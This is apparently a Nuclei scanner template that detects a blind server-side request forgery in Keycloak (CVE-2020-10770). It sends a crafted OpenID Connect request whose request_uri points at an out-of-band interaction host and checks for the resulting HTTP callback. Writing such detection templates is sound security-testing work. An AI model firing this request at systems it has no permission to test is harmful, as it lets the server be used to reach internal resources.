id: keycloak-ssrf

info:
  name: Keycloak Blind SSRF
  author: h3v0x
  severity: medium
  description: Keycloak SSRF
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-10770
  tags: keycloak,ssrf

requests:
  - method: GET
    path:
      - '{{BaseURL}}/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://{{interactsh-url}}/'
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
